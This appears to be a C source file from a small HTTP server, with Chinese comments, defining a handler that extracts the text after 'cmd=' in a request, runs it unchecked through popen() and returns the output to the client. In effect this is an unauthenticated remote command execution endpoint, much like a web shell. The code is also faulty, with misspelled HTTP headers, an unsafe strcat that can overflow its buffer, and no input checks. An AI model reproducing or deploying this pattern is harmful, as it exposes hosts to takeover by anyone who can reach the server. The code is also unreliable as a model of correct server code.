#include "other.h"

void cmd(char *text,int client_socket){//传参报头 
	printf("进入cmd函数");
	char *strcmd; 
	FILE *fp;
    char buffer[1024];
    size_t bytes_read;
    char newline[] = "\n";

    char pos[]="HTTP/1.1 200 OK\r\n"//POST报头
		   "Content-Type: text/plain\r\n"
		   "Access-Control-Allow-Origin: *\r\n"
		   "Content-Lenth:60\n"
		   "atche-Control:public\r\n\r\n";
	printf("-----------打印传入cmd的buffer：%s\n",text); 
	fflush(stdout);//刷新缓冲区
	//处理字符串 
	printf("打印结束-----------------------------");
//	char *ptr = strrchr(text, '\n'); // 查找换行符的位置
 //   if (ptr != NULL) {
 //       *ptr = '\0'; // 将换行符替换为字符串结束符
 //   }
//	printf("替换结尾成功");
	
	//提取请问报文中的命令段
		if((strcmd=strstr(text,"cmd=")) == 0)
	{
		printf("strcmd xxxx");
		return;
	}
		printf("打印提取内容：%s\n",strcmd+4);
		

		
	 // 执行命令并获取标准输出
    fp = popen(strcmd+4, "r");
    if (fp == NULL) {
        perror("Error opening pipe");
        return ;
    }
    
    // 读取命令的输出到字符串中
    memset(buffer,0x00,sizeof(buffer));//清空传回buffer
    bytes_read = fread(buffer, 1, sizeof(buffer), fp);
    if (bytes_read == 0) {
        perror("Error reading from pipe");
        return ;
    }
    //发送 
    printf("即将发送命令%s\n",buffer);
    strcat(buffer, newline);
    send(client_socket, pos, strlen(pos), 0);
    send(client_socket, buffer, bytes_read, 0);
    printf("发送结束");
    
    // 关闭socket和文件指针
    close(client_socket);
    pclose(fp);
		
	return;
		 
}
